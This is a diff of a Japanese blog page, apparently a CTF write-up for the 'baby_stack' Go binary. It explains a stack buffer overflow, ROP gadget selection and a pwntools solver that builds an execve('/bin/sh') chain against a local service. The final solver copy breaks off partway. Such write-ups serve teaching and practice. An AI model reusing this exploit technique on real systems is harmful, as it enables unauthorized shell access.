-     先程エラーが出力された原因と考えられる場所には、2回目の入力の格納先のアドレスと格納先のサイズと思われる <code>0x20(32)</code> が格納されている。</p>
+<p>
+上記の入力を行い、 <code>main.memcpy</code> 終了後のスタックの状態を見てみると、
+     先程エラーが出力された原因と考えられる場所には、2回目の入力の格納先のアドレスと格納先のサイズと思われる <code>0x20(32)</code> が格納されている。
+</p>
 <p>
      このため、 <code>0xc8</code> には何らかの文字列のアドレス、 <code>0xd0</code> と <code>0xd8</code> には文字列のサイズを格納すれば良いと推測できる。
      そこで、実行ファイル中に存在する文字列である <code>&#34;Please&#34;</code> を代わりの文字列として使用する。
-     先程まで利用していたpatternに、上記の値を格納して、再度プログラムを実行してみる。</p>
+     先程まで利用していたpatternに、上記の値を格納して、再度プログラムを実行してみる。
+</p>
 <div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>  pattern <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaac&#39;</span>
-</span></span><span style="display:flex;"><span>  buf2 <span style="color:#f92672">=</span> list(pattern)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># msg</span>
-</span></span><span style="display:flex;"><span>  buf2[<span style="color:#ae81ff">0xc8</span>:<span style="color:#ae81ff">0xd0</span>] <span style="color:#f92672">=</span> p64(please_ptr) <span style="color:#75715e"># string ptr</span>
-</span></span><span style="display:flex;"><span>  buf2[<span style="color:#ae81ff">0xd0</span>:<span style="color:#ae81ff">0xd8</span>] <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x6</span>)        <span style="color:#75715e"># string size</span>
-</span></span><span style="display:flex;"><span>  buf2[<span style="color:#ae81ff">0xd0</span>:<span style="color:#ae81ff">0xd8</span>] <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x6</span>)        <span style="color:#75715e"># string size</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  buf2 <span style="color:#f92672">=</span> buf2[:<span style="color:#ae81ff">0x1f8</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x60</span>]
-</span></span><span style="display:flex;"><span>  buf2 <span style="color:#f92672">=</span> bytes(buf2)</span></span></code></pre></div>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">  pattern <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaac&#39;</span>
+  buf2 <span style="color:#f92672">=</span> list(pattern)
+
+  <span style="color:#75715e"># msg</span>
+  buf2[<span style="color:#ae81ff">0xc8</span>:<span style="color:#ae81ff">0xd0</span>] <span style="color:#f92672">=</span> p64(please_ptr) <span style="color:#75715e"># string ptr</span>
+  buf2[<span style="color:#ae81ff">0xd0</span>:<span style="color:#ae81ff">0xd8</span>] <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x6</span>)        <span style="color:#75715e"># string size</span>
+  buf2[<span style="color:#ae81ff">0xd0</span>:<span style="color:#ae81ff">0xd8</span>] <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x6</span>)        <span style="color:#75715e"># string size</span>
+
+  buf2 <span style="color:#f92672">=</span> buf2[:<span style="color:#ae81ff">0x1f8</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x60</span>]
+  buf2 <span style="color:#f92672">=</span> bytes(buf2)</code></pre></div>
 </div>
 <p>
-     すると、今度は以下のようなエラーが出力される。</p>
+     すると、今度は以下のようなエラーが出力される。
+</p>
 <pre class="example">
-Please tell me your name &gt;&gt; Give me your message &gt;&gt; fatal error: runtime: internal error:
+Please tell me your name >> Give me your message >> fatal error: runtime: internal error:
 misuse of lockOSThread/unlockOSThread
 
 ...
 
-goroutine 1 [[*] Process &#39;./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8&#39; stopped with exit code 2 (pid 54788)
+goroutine 1 [[*] Process './baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8' stopped with exit code 2 (pid 54788)
 running]:
 runtime.systemstack_switch()
 /usr/lib/go-1.6/src/runtime/asm_amd64.s:245 fp=0xc820051480 sp=0xc820051478
@@ -491,28 +519,31 @@ runtime.isExportedRuntime(0x46defd, 0x0, 0x4016ea)
 </pre>
 <p>
      エラーを見ると、 <code>fmt.Printf</code> が原因となっていることがわかる。
-     また、patternが出力されている <code>0x616161616161616e</code> と <code>0x616161616161616f</code> に対応するスタックの領域がエラー箇所であると推測できる。</p>
+     また、patternが出力されている <code>0x616161616161616e</code> と <code>0x616161616161616f</code> に対応するスタックの領域がエラー箇所であると推測できる。
+</p>
 <p>
-     そこで、先程と同様に、これらのpatternのオフセットを求める。</p>
+     そこで、先程と同様に、これらのpatternのオフセットを求める。
+</p>
 <pre class="example">
 gef➤  pattern search 0x616161616161616e
-[+] Searching for &#39;0x616161616161616e&#39;
+[+] Searching for '0x616161616161616e'
 [+] Found at offset 104 (little-endian search) likely
 [+] Found at offset 97 (big-endian search)
 gef➤  pattern search 0x616161616161616f
-[+] Searching for &#39;0x616161616161616f&#39;
+[+] Searching for '0x616161616161616f'
 [+] Found at offset 112 (little-endian search) likely
 [+] Found at offset 105 (big-endian search)
 </pre>
 <p>
      この結果から、 <code>104(0x68)</code> 番目と <code>0x112(0x70)</code> 番目のオフセットに対応する箇所がエラーの原因であると予想できる。
-     ここで、先程と同様にスタックバッファオーバフローが発生しない入力をした際のものと比較してみる。</p>
+     ここで、先程と同様にスタックバッファオーバフローが発生しない入力をした際のものと比較してみる。
+</p>
 <pre class="example">
-Please tell me your name &gt;&gt; hoge
-Give me your message &gt;&gt; fuga
+Please tell me your name >> hoge
+Give me your message >> fuga
 gef➤ dereference
 ...
-0x000000c82004be18│+0x00c8: 0x000000c82000a2e4  →  0x0000000065676f68 (&#34;hoge&#34;?)
+0x000000c82004be18│+0x00c8: 0x000000c82000a2e4  →  0x0000000065676f68 ("hoge"?)
 0x000000c82004be20│+0x00d0: 0x0000000000000004
 ...
 </pre>
@@ -520,190 +551,197 @@ gef➤ dereference
      すると、こちらについても、 <code>0x68</code> 番目は1回目の入力が格納される領域のアドレスであり、
      <code>0x70</code> 番目は入力した文字列のサイズであると推測できる。
      このため、先程と同様に <code>&#34;Please&#34;</code> の文字列を指すようにそれぞれ値を格納し、再度プログラムを実行すると、
-     先程までのエラーを回避し、リターンアドレスを書き換えることができる。</p>
+     先程までのエラーを回避し、リターンアドレスを書き換えることができる。
+</p>
 <p>
-     次に、リターンアドレスを書き換えることにより、シェルの起動を行う。</p>
-</div>
-</div>
-<div id="outline-container-headline-11" class="outline-4">
+     次に、リターンアドレスを書き換えることにより、シェルの起動を行う。
+</p>
 <h4 id="headline-11">
 シェルの起動
 </h4>
-<div id="outline-text-headline-11" class="outline-text-4">
-<p>RIPを奪うことに成功したため、後はROPを組んでシェルを起動できればフラグを取れそうである。
-    そこで、まずシェルの起動に必要なROPガジェットを考える。</p>
+<p>
+RIPを奪うことに成功したため、後はROPを組んでシェルを起動できればフラグを取れそうである。
+    そこで、まずシェルの起動に必要なROPガジェットを考える。
+</p>
 <p>
     一般的はシェルの起動方法として、 <code>execve(&#34;/bin/sh&#34;, 0, 0)</code> を実行する方法がある。
-    これを実行するためには、 <code>rax=59</code> 、 <code>rdi=&#34;/bin/sh&#34;</code> 、 <code>rsi=0</code> および <code>rdx=0</code> を設定し、最後に <code>syscall</code> を呼び出す必要がある。</p>
+    これを実行するためには、 <code>rax=59</code> 、 <code>rdi=&#34;/bin/sh&#34;</code> 、 <code>rsi=0</code> および <code>rdx=0</code> を設定し、最後に <code>syscall</code> を呼び出す必要がある。
+</p>
 <p>
-    そこで、 <code>pop レジスタ; ret;</code> となるガジェットを探し、それぞれのレジスタを設定する。</p>
+    そこで、 <code>pop レジスタ; ret;</code> となるガジェットを探し、それぞれのレジスタを設定する。
+</p>
 <div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>  <span style="color:#75715e">## 0x00000000004026da: syscall;</span>
-</span></span><span style="display:flex;"><span>  syscall <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004026da</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e">## 0x0000000000470931: pop rdi; or byte ptr [rax + 0x39], cl; ret;</span>
-</span></span><span style="display:flex;"><span>  pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000470931</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e">## 0x000000000046defd: pop rsi; ret;</span>
-</span></span><span style="display:flex;"><span>  pop_rsi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000046defd</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e">## 0x00000000004016ea: pop rax; ret;</span>
-</span></span><span style="display:flex;"><span>  pop_rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004016ea</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e">## 0x0000000000448145: pop rdx; setbe byte ptr [rsp + 0x50]; add rsp, 0x38; ret;</span>
-</span></span><span style="display:flex;"><span>  pop_rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000448145</span></span></span></code></pre></div>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">  <span style="color:#75715e">## 0x00000000004026da: syscall;</span>
+  syscall <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004026da</span>
+
+  <span style="color:#75715e">## 0x0000000000470931: pop rdi; or byte ptr [rax + 0x39], cl; ret;</span>
+  pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000470931</span>
+
+  <span style="color:#75715e">## 0x000000000046defd: pop rsi; ret;</span>
+  pop_rsi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000046defd</span>
+
+  <span style="color:#75715e">## 0x00000000004016ea: pop rax; ret;</span>
+  pop_rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004016ea</span>
+
+  <span style="color:#75715e">## 0x0000000000448145: pop rdx; setbe byte ptr [rsp + 0x50]; add rsp, 0x38; ret;</span>
+  pop_rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000448145</span></code></pre></div>
 </div>
-<p>それぞれ、使えそうなガジェットをropper集める。ここで、今回使用するガジェットで、 <code>pop rdi</code> を行うガジェットと <code>pop rdx</code> を行うガジェットはそれぞれ扱いに注意が必要である。</p>
+<p>
+それぞれ、使えそうなガジェットをropper集める。ここで、今回使用するガジェットで、 <code>pop rdi</code> を行うガジェットと <code>pop rdx</code> を行うガジェットはそれぞれ扱いに注意が必要である。
+</p>
 <p>
     まず、 <code>pop rdi</code> を行う <code>pop rdi; or byte ptr [rax + 0x39], cl; ret;</code> は、 <code>pop rdi</code> 以外に <code>rax+0x39</code> のアドレスと <code>cl</code> レジスタの内容を or 演算する。
-    このため、 <code>rax</code> が書き込み不可なアドレスを指していた場合、プログラムがエラーで落ちてしまう。そこで、このガジェットの呼び出し前には、 <code>rax</code> が bss領域を指すようにすることでこの問題に対処する。</p>
+    このため、 <code>rax</code> が書き込み不可なアドレスを指していた場合、プログラムがエラーで落ちてしまう。そこで、このガジェットの呼び出し前には、 <code>rax</code> が bss領域を指すようにすることでこの問題に対処する。
+</p>
 <p>
-    次に、 <code>pop rdx</code> を行う <code>pop rdx; setbe byte ptr [rsp + 0x50]; add rsp, 0x38; ret;</code> は、 スタック領域のアドレスに対して <code>setbe</code> 命令を行い、最後に <code>rsp</code> を <code>0x38</code> バイトだけ増加させる。
+    次に、 <code>pop rdx</code> を行う <code>pop rdx; setbe byte ptr [rsp + 0x50]; add rsp, 0x38; ret;</code> は、 スタック領域のアドレスに対して1バイトだけ書き込みを行う <code>setbe</code> 命令を行い、最後に <code>rsp</code> を <code>0x38</code> バイトだけ増加させる。
     ここで、 <code>rsp</code> がずれると、後ろに続くROPチェーンが機能しなくなる。
-    そこで、~rsp~ が次のガジェットを指すようにこのガジェットの後で <code>0x38</code> バイトだけパディングを行うことでこの問題に対処する。</p>
+    そこで、 <code>rsp</code> が次のガジェットを指すようにこのガジェットの後で <code>0x38</code> バイトだけパディングを行うことでこの問題に対処する。
+</p>
 <p>
-    それぞれのレジスタにスタックから値をpopするガジェットの用意ができたため、これらを用いてROPチェーンを組んでいく。</p>
+    それぞれのレジスタにスタックから値をpopするガジェットの用意ができたため、これらを用いてROPチェーンを組んでいく。
+</p>
 <p>
     ここで、 <code>rdi</code> には、 <code>&#34;/bin/sh&#34;</code> の文字列のアドレスを格納する必要がある。
     しかし、実行ファイル上には、 <code>&#34;/bin/sh&#34;</code> の文字列は存在しない。そこで、ROPを用いてこの文字列をメモリ上に作成する。
-    文字列を作成する領域としては、アドレスが変わらず、メモリへの読み書きどちらも可能となるbss領域が適しているため、bss領域に <code>&#34;/bin/sh&#34;</code> を書き込むことを考える。</p>
+    文字列を作成する領域としては、アドレスが変わらず、メモリへの読み書きどちらも可能となるbss領域が適しているため、bss領域に <code>&#34;/bin/sh&#34;</code> を書き込むことを考える。
+</p>
 <p>
-    文字列をメモリ上に作成する方法として、ROPガジェットを利用して作成する方法と、 <code>write</code> システムコールを利用して作成する方法の2通りが考えられるが、今回は前者のROPガジェットを用いた方法を利用する。</p>
+    文字列をメモリ上に作成する方法として、ROPガジェットを利用して作成する方法と、 <code>write</code> システムコールを利用して作成する方法の2通りが考えられるが、今回は前者のROPガジェットを用いた方法を利用する。
+</p>
 <p>
-    この方法は、以下の手順で実現できる。</p>
+    この方法は、以下の手順で実現できる。
+</p>
 <ol>
 <li>
-<p>レジスタ1 ( <code>rdi</code> )に文字列を書き込みたいアドレス( <code>bss_addr</code> )を格納</p>
+<p>
+レジスタ1 ( <code>rdi</code> )に文字列を書き込みたいアドレス( <code>bss_addr</code> )を格納
+</p>
 <div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>buf <span style="color:#f92672">=</span> p64(pop_rdi)
-</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p64(bss_addr)</span></span></code></pre></div>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">buf <span style="color:#f92672">=</span> p64(pop_rdi)
+buf <span style="color:#f92672">+=</span> p64(bss_addr)</code></pre></div>
 </div>
 </li>
 <li>
-<p>レジスタ2( <code>rax</code> )に書き込みたい文字列( <code>&#34;/bin/sh&#34;</code> )を格納</p>
+<p>
+レジスタ2( <code>rax</code> )に書き込みたい文字列( <code>&#34;/bin/sh&#34;</code> )を格納
+</p>
 <div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p64(pop_rax)
-</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span></span></span></code></pre></div>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">buf <span style="color:#f92672">+=</span> p64(pop_rax)
+buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span></code></pre></div>
 </div>
 </li>
 <li>
-<p><code>mov [レジスタ1], レジスタ2</code> の形のガジェットを利用し、レジスタ1の指すアドレスにレジスタ2の内容を書き込み</p>
+<p>
+<code>mov [レジスタ1], レジスタ2</code> の形のガジェットを利用し、レジスタ1の指すアドレスにレジスタ2の内容を書き込み
+</p>
 <div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">## 0x0000000000456499: mov qword ptr [rdi], rax; ret;</span>
-</span></span><span style="display:flex;"><span>mov_rdi_rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000456499</span>
-</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p64(mov_rdi_rax)</span></span></code></pre></div>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">## 0x0000000000456499: mov qword ptr [rdi], rax; ret;</span>
+mov_rdi_rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000456499</span>
+buf <span style="color:#f92672">+=</span> p64(mov_rdi_rax)</code></pre></div>
 </div>
 </li>
 </ol>
-<p>以上のROPガジェットを組み合わせることで、リターンアドレスの書き換えからシェルを起動することができる。</p>
 <p>
-    最後に、上記の流れをSolverとして実装したため、Solverとその実行結果を示す。</p>
-</div>
-</div>
-</div>
-</div>
-<div id="outline-container-headline-12" class="outline-3">
+以上のROPガジェットを組み合わせることで、リターンアドレスの書き換えからシェルを起動することができる。
+</p>
+<p>
+    最後に、上記の流れをSolverとして実装したため、Solverとその実行結果を示す。
+</p>
 <h3 id="headline-12">
 Solver    
 </h3>
-<div id="outline-text-headline-12" class="outline-text-3">
-<div id="outline-container-headline-13" class="outline-4">
 <h4 id="headline-13">
 solver   
 </h4>
-<div id="outline-text-headline-13" class="outline-text-4">
 <div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>   <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8&#39;</span>
-</span></span><span style="display:flex;"><span>   chall <span style="color:#f92672">=</span> ELF(filename)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   <span style="color:#75715e"># socat TCP-LISTEN:8000,reuseaddr,fork EXEC:&#34;./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8&#34;</span>
-</span></span><span style="display:flex;"><span>   conn <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;localhost&#39;</span>, <span style="color:#ae81ff">8000</span>)
-</span></span><span style="display:flex;"><span>   <span style="color:#75715e"># conn = process(filename)</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   <span style="color:#75715e"># ROP Gadgets</span>
-</span></span><span style="display:flex;"><span>   bss_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000058e000</span>
-</span></span><span style="display:flex;"><span>   hoge_str <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000c8200a2000</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   <span style="color:#75715e">## 0x00000000004026da: syscall;</span>
-</span></span><span style="display:flex;"><span>   syscall <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004026da</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   <span style="color:#75715e">## 0x0000000000470931: pop rdi; or byte ptr [rax + 0x39], cl; ret;</span>
-</span></span><span style="display:flex;"><span>   pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000470931</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   <span style="color:#75715e">## 0x0000000000456499: mov qword ptr [rdi], rax; ret;</span>
-</span></span><span style="display:flex;"><span>   mov_rdi_rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000456499</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   <span style="color:#75715e">## 0x000000000046defd: pop rsi; ret;</span>
-</span></span><span style="display:flex;"><span>   pop_rsi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000046defd</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   <span style="color:#75715e">## 0x00000000004016ea: pop rax; ret;</span>
-</span></span><span style="display:flex;"><span>   pop_rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004016ea</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   <span style="color:#75715e">## 0x0000000000448145: pop rdx; setbe byte ptr [rsp + 0x50]; add rsp, 0x38; ret;</span>
-</span></span><span style="display:flex;"><span>   pop_rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000448145</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   <span style="color:#75715e">## static string</span>
-</span></span><span style="display:flex;"><span>   please_ptr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x521f00</span>
-</span></span><span style="display:flex;"><span>   please_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   <span style="color:#75715e"># Input name (First input)</span>
-</span></span><span style="display:flex;"><span>   buf1 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;hoge&#34;</span>
-</span></span><span style="display:flex;"><span>   conn<span style="color:#f92672">.</span>sendline(buf1)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   <span style="color:#75715e"># Input msg (Second input)</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#75715e">## name string</span>
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x68</span>
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> p64(please_ptr)
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> p64(please_size)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   <span style="color:#75715e">## msg string</span>
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0xc8</span><span style="color:#f92672">-</span>len(buf2))
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> p64(please_ptr)
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> p64(please_size)
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> p64(please_size)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x198</span><span style="color:#f92672">-</span>len(buf2))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   <span style="color:#75715e"># ROP</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#75715e">## rdx = 0</span>
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> p64(pop_rdx)
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span>)
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x38</span>    <span style="color:#75715e"># add rsp, 0x38</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   <span style="color:#75715e">## rsi = 0</span>
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> p64(pop_rsi)
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   <span style="color:#75715e">## rdi = &#34;/bin/sh&#34;</span>
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> p64(pop_rax)
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> p64(bss_addr) <span style="color:#75715e"># initialize rax with bss_addr</span>
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> p64(pop_rdi)
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> p64(bss_addr)
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> p64(pop_rax)
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> p64(mov_rdi_rax)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   <span style="color:#75715e">## rax = 59</span>
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> p64(pop_rax)
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">59</span>)      <span style="color:#75715e"># execve</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   <span style="color:#75715e">## execve(&#34;/bin/sh&#34;, 0, 0)</span>
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> p64(syscall)
-</span></span><span style="display:flex;"><span>   conn<span style="color:#f92672">.</span>sendline(buf2)
-</span></span><span style="display:flex;"><span>   conn<span style="color:#f92672">.</span>interactive()</span></span></code></pre></div>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">   <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+   filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8&#39;</span>
+   chall <span style="color:#f92672">=</span> ELF(filename)
+
+   <span style="color:#75715e"># socat TCP-LISTEN:8000,reuseaddr,fork EXEC:&#34;./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8&#34;</span>
+   conn <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;localhost&#39;</span>, <span style="color:#ae81ff">8000</span>)
+   <span style="color:#75715e"># conn = process(filename)</span>
+
+   <span style="color:#75715e"># ROP Gadgets</span>
+   bss_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000058e000</span>
+   hoge_str <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000c8200a2000</span>
+
+   <span style="color:#75715e">## 0x00000000004026da: syscall;</span>
+   syscall <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004026da</span>
+
